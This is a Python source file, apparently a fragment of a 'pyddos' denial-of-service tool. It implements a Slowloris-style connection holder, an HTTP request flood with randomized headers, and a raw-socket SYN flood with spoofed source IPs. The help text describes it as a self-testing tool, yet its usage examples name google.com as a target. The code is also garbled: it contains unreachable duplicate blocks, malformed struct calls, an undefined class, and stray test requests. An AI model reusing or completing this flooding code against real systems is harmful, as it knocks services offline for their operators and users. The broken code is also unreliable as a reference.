            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
            "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1464.0 Safari/537.36",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5",
            "Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko ) Version/5.1 Mobile/9B176 Safari/7534.48.3",
            "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1500.55 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0",
            "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36"
        ]


def mypkt(self):
    text = (
        f"{random.choice(self.method)} /{random.randint(1, 999999999)} HTTP/1.1\r\n"
        f"Host: {dst_ip}\r\n"
        f"User-Agent: {random.choice(self.add_useragent())}\r\n"
        "Content-Length: 42\r\n\r\n"
    )
    pkt = text.encode()  # Convert string to bytes
    return pkt

def building_socket(self):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.settimeout(self.to)
        sock.connect((dst_ip, int(self.port)))
        
        if sock:
            sock.sendall(self.mypkt())  # Use sendall() instead of sendto()
            self.pkt_count += 1
        
        return sock
    
    except KeyboardInterrupt:
        sys.exit(cprint("[-] Canceled by user", "red"))
    
    except Exception as e:
        cprint(f"[!] Failed to build socket: {e}", "red")
        return None

def sending_packets(self):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
        sock.settimeout(self.to)
        sock.connect((dst_ip, int(self.port)))
        self.pkt_count += 3

        if sock:
            sock.sendall(b'X-a: b\r\n')  # Fixed encoding issue
            self.pkt_count += 1  # Was `self.pkt` which is undefined

    except KeyboardInterrupt:
        sys.exit(cprint("[-] Canceled by user", "red"))

    except Exception as e:
        cprint(f"[!] Connection failed: {e}", "red")
        return None  # Instead of retrying blindly, return None

    return sock

def doconnection(self):
    socks = 0
    fail = 0
    lsocks = []
    lhandlers = []
    
    cprint('\t\tBuilding sockets', 'blue')
    
    while socks < int(self.threads):
        try:
            sock = self.building_socket()
            if sock:
                lsocks.append(sock)
                socks += 1
        except Exception as e:
            fail += 1
            cprint(f"[!] Failed to build socket ({fail} failures): {e}", "red")
        except KeyboardInterrupt:
            sys.exit(cprint("[-] Canceled by user", "red"))

    cprint('\t\tSending packets', 'blue')

    while socks < int(self.threads):
        try:
            handler = self.sending_packets()
            if handler:
                lhandlers.append(handler)
                socks += 1
        except Exception as e:
            fail += 1
            cprint(f"[!] Failed to send packet ({fail} failures): {e}", "red")
        except KeyboardInterrupt:
            sys.exit(cprint("[-] Canceled by user", "red"))
    
    cprint(f"I have sent {colored(str(self.pkt_count), 'cyan')} packets successfully.", "green")
    cprint(f"Now I'm going to sleep for {colored(self.sleep, 'red')} seconds.", "green")

    time.sleep(self.sleep)


class Requester(Thread):
    def __init__(self, tgt):
        super().__init__()
        dst_ip = tgt
        self.port = None
        self.ssl = False
        self.req = []
        self.lock = Lock()
        self.response_counts = defaultdict(int)  # ✅ Stores response code counts

        # Parse the URL
        url_type = urllib.parse.urlparse(dst_ip)
        if url_type.scheme == "https":
            self.ssl = True
            self.port = 443
        else:
            self.port = 80

    def run(self):
        try:
            if self.ssl:
                conn = http.client.HTTPSConnection(dst_ip, self.port)
            else:
                conn = http.client.HTTPConnection(dst_ip, self.port)
            
            self.req.append(conn)

            for reqter in self.req:
                url, http_header = self.data()
                method = choice(["GET", "POST"])
                reqter.request(method.upper(), url, None, http_header)
                
                response = reqter.getresponse()
                status_code = response.status  # ✅ Get HTTP response code
                
                with self.lock:  # ✅ Thread-safe increment
                    self.response_counts[status_code] += 1

                print(f"[Thread-{self.name}] Response: {status_code}")  # ✅ Debug output

        except KeyboardInterrupt:
            sys.exit(cprint("[-] Canceled by user", "red"))
        except Exception as e:
            print(e)
        finally:
            self.closeConnections()

    def closeConnections(self):
        for conn in self.req:
            try:
                conn.close()
            except:
                pass

def header(self):
    """Generate randomized HTTP headers."""
    
    cachetype = [
        "no-cache", "no-store", f"max-age={random.randint(0, 10)}",
        f"max-stale={random.randint(0, 100)}", f"min-fresh={random.randint(0, 10)}",
        "notransform", "only-if-cache"
    ]
    
    accept_encodings = [
        "compress,gzip", "*", "",
        "compress;q=0.5, gzip;q=1.0",
        "gzip;q=1.0, identity;q=0.5, *;q=0"
    ]
    
    # Construct HTTP headers
    http_header = {
        "User-Agent": random.choice(user_agents),
        "Cache-Control": random.choice(cachetype),
        "Accept-Encoding": random.choice(accept_encodings),
        "Keep-Alive": "42",
        "Host": dst_ip,
        "Referer": random.choice(bot_list)
    }
    
    return http_header

class Synflood(Thread):
    def __init__(self, tgt, ip, sock=None):
        super().__init__()

        self.tgt = tgt  # ✅ Initialize target
        self.ip = ip  # ✅ Initialize source IP

        if sock is None:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        else:
            self.sock = sock

    def checksum(self, data: bytes) -> int:
        """Compute the Internet Checksum for a given data."""
        s = 0
        if len(data) % 2 != 0:
            data += b"\x00"  # Ensure even length

        for i in range(0, len(data), 2):
            w = (data[i] << 8) + (data[i+1] if i+1 < len(data) else 0)
            s = s + w

        while s >> 16:
              s = (s & 0xFFFF) + (s >> 16)

        return ~s & 0xffff

    def build_packet(self, tgt, ip, sock=None):
        """Build a SYN packet with a fake IP and TCP header."""
        # IP Header
        ihl_version = (4 << 4) | 5  # IPv4 + IHL=5
        tos = 0
        tot_len = 40  # Header size only
        ip_id = random.randint(1024, 65535)
        frag_off = 0
        ttl = 64
        protocol = IPPROTO_TCP
        check = 0
        urg_ptr = 0

        # Convert IPs to binary
        s_addr = inet_aton(ip)  # ✅ Convert source IP
        d_addr = inet_aton(tgt)  # ✅ Convert target IP

        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            ihl_version,
            tos,
            tot_len,
            ip_id,
            frag_off,
            ttl,
            protocol,
            check,
            s_addr,  # ✅ Correct source IP format
            d_addr   # ✅ Correct destination IP format
        )

        # TCP Header
        source = random.randint(1024, 65535)  # ✅ Random source port
        dest = 80  # Destination port (HTTP)
        seq = random.randint(0, 4294967295)  # ✅ Random sequence number
        ack_seq = 0
        doff = 5  # Data offset (5 words, no options)
        flags = 0b000010  # SYN flag set
        window = 5840
        check = 0
        urg_ptr = 0  # ✅ Define urg_ptr before using it

        tcp_header = struct.pack(
            "!HHLLBBHHH",
            source,
            dest,
            seq,
            ack_seq,
            (doff << 4),
            flags,
            window,
            check,
            urg_ptr,
        )

        # Pseudo Header for TCP Checksum Calculation
        placeholder = 0
        tcp_length = len(tcp_header)
        pseudo_header = struct.pack(
            "!4s4sBBH",
            inet_aton(self.ip),  # ✅ Ensure it's a valid IP string
            inet_aton(self.tgt),  # ✅ Ensure it's a valid target IP
            0,  # Placeholder
            IPPROTO_TCP,
            len(tcp_header)
        )

        # Compute Checksum
        tcp_checksum = self.checksum(pseudo_header + tcp_header)

        # Calculate TCP checksum
        tcp_checksum = self.checksum(pseudo_header + tcp_header)
        tcp_header = struct.pack(
            "!HHLLBBH",
            source,
            dest,
            seq,
            0,
            (5 << 4),
            2,
            5840
        ) + struct.pack('H', tcp_checksum) + struct.pack('H', 0)

        # Combine headers into final packet
        return ip_header + tcp_header

        # Final TCP Header with Correct Checksum
        tcp_header = struct.pack(
            "!HHLLBBHHH",
            source,
            dest,
            seq,
            ack_seq,
            (doff << 4),
            flags,
            window,
            tcp_checksum,
            urg_ptr,
            src_port,
            dst_port,
            seq_num,
            0,
            (5 << 4),
            2,
            5840
        )

        # Full Packet (IP Header + TCP Header)
        return ip_header + tcp_header

    def run(self):
        """Run the attack and send packets in a loop."""
        while True:
            packet = self.build_packet(self.tgt, self.ip)
            try:
                self.sock.sendto(packet, (self.tgt, 0))
                print(f"[*] Sent SYN to {self.tgt} from {self.ip}")
            except KeyboardInterrupt:
                print("[-] Attack stopped by user")
                break
            except Exception as e:
                print(f"[ERROR] {e}")

def main():
    parser = ArgumentParser(
        usage="python3 pyddos.py -d <target> [-p <port>] [-T <threads>] [attack type]",
        formatter_class=RawTextHelpFormatter,  # ✅ Fixed
        prog="pyddos",
        description="Pyddos - A Python-based DDoS testing tool for stress-testing your own servers.",
        epilog=("""
        Examples:
        python3 pyddos.py -d www.example.com -p 80 -T 2000 -Pyslow
        python3 pyddos.py -d www.domain.com -s 100 -Request
        python3 pyddos.py -d www.google.com -Synflood -T 5000 -t 10.0
        """)
    )

    parser.add_argument("-d", "--destination", required=True, help="Target domain or IP")
    parser.add_argument("-p", "--port", type=int, default=80, help="Port number (default: 80)")
    parser.add_argument("-T", "--threads", type=int, default=500, help="Number of threads")
    parser.add_argument("-t", "--timeout", type=float, default=5.0, help="Socket timeout (default: 5s)")
    parser.add_argument("attack", choices=["Pyslow", "Request", "Synflood"], help="Attack method")

    args = parser.parse_args()

    cprint(f"[+] Target: {args.destination} | Port: {args.port} | Threads: {args.threads} | Attack: {args.attack}", "green")

    if args.attack == "Synflood":
        for _ in range(args.threads):
            spoof_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
            thread = Synflood(args.destination, spoof_ip)
            thread.start()

# Define parser
parser = argparse.ArgumentParser(description="Pyddos - DDoS Attack Simulation Tool")
options = parser.add_argument_group('options', '')

# Add Arguments
options.add_argument('-d', metavar='<ip|domain>', required=True, help='Specify your target IP or domain')
options.add_argument('-t', metavar='<float>', default=5.0, help='Set timeout for socket')
options.add_argument('-T', metavar='<int>', default=1000, help='Set number of threads (default = 1000)')
options.add_argument('-p', metavar='<int>', default=80, help='Specify target port (only for Pyslow attack)')
options.add_argument('-s', metavar='<int>', default=100, help='Set sleep time for reconnection')
options.add_argument('-i', metavar='<ip address>', help='Specify a spoofed IP')
options.add_argument('-Request', action='store_true', help='Enable request attack')
options.add_argument('-Synflood', action='store_true', help='Enable SYN flood attack')
options.add_argument('-Pyslow', action='store_true', help='Enable Pyslow attack')
options.add_argument('--fakeip', action='store_true', help='Create a fake IP if spoofed IP is not specified')

# Placeholder functions
def add_bots():
    return [
        "https://www.google.com/",
        "https://www.bing.com/",
        "https://www.yahoo.com/",
        "https://www.duckduckgo.com/"
    ]

def add_useragent():
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    ]

# Argument parsing (assuming parser is defined)
args = parser.parse_args()

def check_tgt(args):
    """Returns the target IP or domain."""
    return args.d  # ✅ FIXED: Using correct argument name

def fake_ip():
    """Generate a valid random spoofed IP address (avoiding private & reserved ranges)."""
    while True:
        ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
        # Avoid private/reserved IP ranges
        octets = list(map(int, ip.split(".")))
        if (
            (octets[0] == 10) or  # 10.0.0.0/8
            (octets[0] == 172 and 16 <= octets[1] <= 31) or  # 172.16.0.0/12
            (octets[0] == 192 and octets[1] == 168) or  # 192.168.0.0/16
            (octets[0] == 127)  # Loopback
        ):
            continue
        return ip  # ✅ Returns only valid public IPs

# Example usage
target = check_tgt(args)
print(f"Target: {target}")
print(f"Fake IP: {fake_ip()}")
print(f"Random User-Agent: {random.choice(add_useragent())}")
print(f"Random Referer: {random.choice(add_bots())}")

# Generate a random User-Agent
ua = UserAgent()
headers = {"User-Agent": ua.random}

# Make a request with a fake User-Agent
url = "https://example.com"
response = requests.get(url, headers=headers)

print(response.text)


# Check for root privileges
if args.Synflood:
    if os.geteuid() != 0:
        sys.exit(cprint('[-] You do not have root permissions!', 'red'))

    tgt = check_tgt(args)
    synsock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
    synsock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)

    print(colored('[*] Starting SYN Flood on: ', 'blue') + colored(tgt, 'red'))

    max_threads = int(args.T)  # Number of attack threads
    active_threads = []

    try:
        while True:
            ip = fake_ip() if not args.i else args.i

            # Only spawn new threads if we haven't hit the max limit
            if len(active_threads) < max_threads:
                thread = Synflood(tgt, ip, sock=synsock)
                thread.daemon = True
                thread.start()
                active_threads.append(thread)

            # Remove finished threads from the list
            active_threads = [t for t in active_threads if t.is_alive()]

            # Throttle the loop slightly to prevent CPU exhaustion
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit(cprint("[-] Canceled by user", "red"))

elif args.Request:
    tgt = args.d
    threads = []
    print(colored('[*] Sending requests to: ', 'blue') + colored(tgt, 'red'))

    try:
        while True:
            # Spawn new threads up to the max limit
            while len(threads) < int(args.T):
                t = Requester(tgt)
                t.daemon = True
                t.start()
                threads.append(t)

            # Remove dead threads to prevent memory leaks
            threads = [t for t in threads if t.is_alive()]

            # Prevent CPU exhaustion
            time.sleep(0.1)

    except KeyboardInterrupt:
        sys.exit(cprint("[-] Canceled by user", "red"))

elif args.Pyslow:
    try:
        tgt = args.d
        port = args.p
        to = float(args.t)
        st = int(args.s)
        threads = int(args.T)
    except Exception as e:
        sys.exit(cprint(f"[-] Error parsing arguments: {e}", 'red'))

    print(colored(f"[*] Starting Pyslow Attack on {tgt}:{port} with {threads} threads", "blue"))

    thread_list = []

    try:
        # Spawn all threads
        for _ in range(threads):
            worker = Pyslow(tgt, port, to, threads, st)
            worker.daemon = True  # Make thread exit when the script stops
            worker.start()
            thread_list.append(worker)

        # Keep threads alive
        for thread in thread_list:
            thread.join()
    
    except KeyboardInterrupt:
        sys.exit(cprint("[-] Canceled by user", "red"))

# Main Execution
if __name__ == "__main__":
    print(colored("[*] PyDDOS Attack Script Started", "blue"))

if __name__ == "__main__":
    main()
